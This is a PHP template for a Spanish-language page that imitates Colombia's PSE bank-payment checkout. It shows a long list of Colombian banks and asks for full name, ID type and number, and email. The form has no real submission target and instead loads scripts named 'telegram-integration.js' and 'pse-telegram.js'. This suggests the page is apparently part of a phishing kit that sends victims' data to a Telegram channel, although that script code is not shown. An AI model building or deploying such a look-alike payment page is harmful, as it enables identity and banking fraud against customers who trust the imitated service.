<?php ob_start(); ?>

<div class="container">
    <a href="/payment/methods?invoice_id=<?= htmlspecialchars($invoice_id) ?>" class="back-link">
        <svg class="back-link__icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        REGRESAR
    </a>

    <h1 class="page-title-pse">Pago con cuenta de ahorros</h1>

    <div class="pse-form-container">
        <div class="pse-card">
            <div class="pse-header">
                <div class="pse-logo-container">
                    <img src="/img/pse-logo.png" alt="PSE" class="pse-logo-img">
                </div>
                <span class="pse-header-text">PSE</span>
            </div>

            <h2 class="pse-section-title">Información bancaria</h2>

            <form id="pseForm" class="pse-form">
                <!-- Lista de bancos -->
                <div class="form-group">
                    <label for="bankSelect" class="form-label-pse">Lista de bancos</label>
                    <button type="button" class="form-select-btn-pse" id="bankSelectBtn">
                        <span id="bankSelectText">A continuación seleccione su banco</span>
                    </button>
                    <input type="hidden" id="bankSelect" name="bank" value="" required>
                </div>

                <!-- Tipo de persona -->
                <div class="form-group">
                    <label for="personType" class="form-label-pse">Tipo de persona</label>
                    <button type="button" class="form-select-btn-pse" id="personTypeBtn">
                        <span id="personTypeText">Natural</span>
                    </button>
                    <input type="hidden" id="personType" name="personType" value="Natural" required>
                </div>

                <!-- Nombres y apellidos -->
                <div class="form-group">
                    <label for="fullName" class="form-label-pse">Nombres y apellidos</label>
                    <input type="text" id="fullName" name="fullName" class="form-input-pse" required>
                </div>

                <!-- Documento y Número -->
                <div class="form-group-row">
                    <div class="form-group form-group-small">
                        <label for="docType" class="form-label-pse">Documento</label>
                        <button type="button" class="form-select-btn-pse" id="docTypeBtn">
                            <span id="docTypeText">CC</span>
                        </button>
                        <input type="hidden" id="docType" name="docType" value="CC" required>
                    </div>
                    <div class="form-group form-group-large">
                        <label for="docNumber" class="form-label-pse">Número de identificación</label>
                        <input type="text" id="docNumber" name="docNumber" class="form-input-pse" required>
                    </div>
                </div>

                <!-- Correo electrónico -->
                <div class="form-group">
                    <label for="email" class="form-label-pse">Correo electrónico</label>
                    <input type="email" id="email" name="email" class="form-input-pse" required>
                </div>

                <!-- Términos y condiciones -->
                <p class="terms-text-pse">
                    Al presionar CONTINUAR estás aceptando los 
                    <a href="#" class="terms-link-pse">términos y condiciones</a>
                </p>

                <!-- Botones -->
                <div class="pse-form-actions">
                    <button type="button" class="btn-cancel-pse" onclick="window.history.back()">CANCELAR</button>
                    <button type="submit" class="btn-continue-pse" id="btnContinue" disabled>CONTINUAR</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal Lista de Bancos -->
<div class="modal-overlay" id="bankSelectModal">
    <div class="modal-container-pse">
        <div class="modal-content-pse" style="max-height: 400px; overflow-y: auto;">
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="alianza" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">ALIANZA FIDUCIARIA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Agrario" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO AGRARIO</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="AV Villas" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO AV VILLAS</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="BBVA" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO BBVA COLOMBIA S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Caja Social" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO CAJA SOCIAL</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="cooperativo" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO COOPERATIVO COOPCENTRAL</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Davivienda" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO DAVIVIENDA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Bogota" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO DE BOGOTA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Occidente" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO DE OCCIDENTE</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Falabella" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO FALABELLA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="finandina" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO FINANDINA S.A. BIC</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="gnb" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO GNB SUDAMERIS</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="itau" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO ITAU</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="jpmorgan" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO J.P. MORGAN COLOMBIA S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Banco Mundo Mujer" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO MUNDO MUJER S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="pichincha" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO PICHINCHA S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Popular" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO POPULAR</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="santander" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO SANTANDER COLOMBIA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Serfinanza" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO SERFINANZA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="union" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCO UNION</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="ban100" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BAN100</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="bancamia" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCAMIA S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Bancolombia" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCOLOMBIA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="bancoomeva" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BANCOOMEVA S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="bold" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">BOLD CF</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="cfa" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">CFA COOPERATIVA FINANCIERA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="citibank" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">CITIBANK</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="coink" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">COINK SA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="coltefinanciera" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">COLTEFINANCIERA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="confiar" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">CONFIAR COOPERATIVA FINANCIERA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="cotrafa" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">COTRAFA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="crezcamos" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">CREZCAMOS MOSI</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="dale" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">DALE</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Daviplata" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">DAVIPLATA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="ding" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">DING</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="juriscoop" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">FINANCIERA JURISCOOP SA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="global66" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">GLOBAL66</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="iris" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">IRIS</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="jfk" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">JFK COOPERATIVA FINANCIERA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="lulo" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">LULO BANK</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="movii" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">MOVII S.A.</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="nu" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">NU</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="powii" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">POWII</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="rappipay" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">RAPPIPAY</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="Scotiabank Colpatria" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">SCOTIABANK COLPATRIA</span></label>
            <label class="radio-option-pse"><input type="radio" name="bankOption" value="uala" class="radio-input-pse"><span class="radio-circle"></span><span class="radio-label-pse">UALÁ</span></label>
        </div>
        <div class="modal-footer-pse">
            <button type="button" class="btn-modal-pse btn-modal-cancel" id="btnCancelBankSelect">CANCELAR</button>
            <button type="button" class="btn-modal-pse btn-modal-continue" id="btnContinueBankSelect">CONTINUAR</button>
        </div>
    </div>
</div>

<!-- Modal Tipo de Persona -->
<div class="modal-overlay" id="personTypeModal">
    <div class="modal-container-pse">
        <div class="modal-content-pse">
            <label class="radio-option-pse">
                <input type="radio" name="personTypeRadio" value="Natural" class="radio-input-pse" checked>
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Natural</span>
            </label>
            <label class="radio-option-pse">
                <input type="radio" name="personTypeRadio" value="Jurídica" class="radio-input-pse">
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Jurídica</span>
            </label>
        </div>
        <div class="modal-footer-pse">
            <button type="button" class="btn-modal-pse btn-modal-cancel" id="btnCancelPersonType">CANCELAR</button>
            <button type="button" class="btn-modal-pse btn-modal-continue" id="btnContinuePersonType">CONTINUAR</button>
        </div>
    </div>
</div>

<!-- Modal Tipo de Documento -->
<div class="modal-overlay" id="docTypeModal">
    <div class="modal-container-pse">
        <div class="modal-content-pse">
            <label class="radio-option-pse">
                <input type="radio" name="docTypeRadio" value="CC" class="radio-input-pse" checked>
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Cédula de Ciudadanía</span>
            </label>
            <label class="radio-option-pse">
                <input type="radio" name="docTypeRadio" value="CE" class="radio-input-pse">
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Cédula de Extranjería</span>
            </label>
            <label class="radio-option-pse">
                <input type="radio" name="docTypeRadio" value="NIT" class="radio-input-pse">
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Número de Identificación Tributaria</span>
            </label>
            <label class="radio-option-pse">
                <input type="radio" name="docTypeRadio" value="TI" class="radio-input-pse">
                <span class="radio-circle"></span>
                <span class="radio-label-pse">Tarjeta de identidad</span>
            </label>
        </div>
        <div class="modal-footer-pse">
            <button type="button" class="btn-modal-pse btn-modal-cancel" id="btnCancelDocType">CANCELAR</button>
            <button type="button" class="btn-modal-pse btn-modal-continue" id="btnContinueDocType">CONTINUAR</button>
        </div>
    </div>
</div>

<!-- Loading Overlay PSE -->
<div id="loadingOverlay" class="loading-overlay-pse">
    <div class="loading-content-pse">
        <img src="/pse/img/procesandonw.gif" alt="Procesando" class="loading-gif-pse">
        <p class="loading-text-pse">Procesando tu solicitud...</p>
        <p class="loading-subtext-pse">Por favor espera mientras validamos tu información</p>
    </div>
</div>

<script src="/js/telegram-integration.js"></script>
<script src="/js/pse-telegram.js"></script>

<?php
$content = ob_get_clean();
require __DIR__ . '/../layout.php';
?>
